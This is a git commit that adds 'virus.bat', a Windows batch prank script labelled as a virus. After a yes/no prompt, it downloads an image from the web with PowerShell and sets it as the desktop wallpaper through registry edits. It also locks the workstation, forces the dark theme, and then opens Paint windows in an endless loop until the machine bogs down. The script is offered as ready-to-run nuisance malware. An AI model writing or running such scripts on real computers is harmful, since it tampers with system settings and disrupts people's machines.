ca9e7b28f8e111e1e403b986d0a2677c4d98eedb
tlochsta <81081702+tlochsta@users.noreply.github.com>
2024-08-27 19:25:58 -0400

    Create virus.bat

---
+++ virus.bat
@@ -0,0 +1,27 @@
+@echo off
+title silly billy
+color 0A
+cls
+echo silly billy virus, answer the question that it asks lil bro
+echo MsgBox "do u wanna run this?", 4+32, "sillybilly" > %temp%\confirm.vbs
+cscript //nologo %temp%\confirm.vbs | findstr "6" >nul && goto :confirmed
+echo You chose not to proceed. Exiting...
+del %temp%\confirm.vbs
+pause
+exit
+:confirmed
+del %temp%\confirm.vbs
+set "imageUrl=https://media.tenor.com/Qfz661n_2SAAAAAe/yellow-emoji-funny.png"
+set "imagePath=%temp%\fun_image.jpg"
+powershell -Command "(New-Object Net.WebClient).DownloadFile('%imageUrl%', '%imagePath%')"
+reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%imagePath%" /f
+RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters ,1 ,True
+powershell -command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class LockScreen { [DllImport(\"user32.dll\")] public static extern void LockWorkStation(); }'; LockScreen::LockWorkStation()"
+powershell -Command "Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize -Name ColorPrevalence -Value 1"
+powershell -Command "Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize -Name SystemUsesLightTheme -Value 0"
+:spamloop
+start "" "%SystemRoot%\System32\mspaint.exe" "%imagePath%"
+timeout /nobreak /t 1 >nul
+goto spamloop
+echo skibidi
+pause
